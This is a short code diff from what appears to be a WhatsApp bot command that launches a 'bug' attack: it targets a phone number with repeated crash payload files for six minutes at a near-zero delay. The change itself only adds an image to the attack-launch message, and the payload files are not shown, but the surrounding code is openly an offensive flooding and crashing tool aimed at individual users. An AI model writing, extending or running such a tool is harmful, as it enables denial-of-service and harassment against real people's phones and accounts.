@@ -44,8 +44,12 @@ cmd({
       }, { quoted: mek });
     }
 
+    // ✅ VOYE IMG 4.png AVAN ATAK
+    const imagePath = path.join(__dirname, '../media/4.png');
+    const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
-      text: `💥 𝐉𝐄𝐒𝐔𝐒-𝐗-𝐃𝐀𝐖𝐄𝐍𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 💥\n\n🎯 Target: wa.me/${targetNumber}\n⏱ Duration: 6min\n⚡ Delay: 0.0001s\n📦 Payloads: ${bugFiles.length} x2\n\n🚨 *POWERED BY DAWENS BOY 🇭🇹🔥*`,
+      image: imageBuffer,
+      caption: `💥 𝐉𝐄𝐒𝐔𝐒-𝐗-𝐃𝐀𝐖𝐄𝐍𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 💥\n\n🎯 Target: wa.me/${targetNumber}\n⏱ Duration: 6min\n⚡ Delay: 0.0001s\n📦 Payloads: ${bugFiles.length} x2\n\n🚨 *POWERED BY DAWENS BOY 🇭🇹🔥*`,
     }, { quoted: mek });
 
     const endTime = Date.now() + (6 * 60 * 1000);
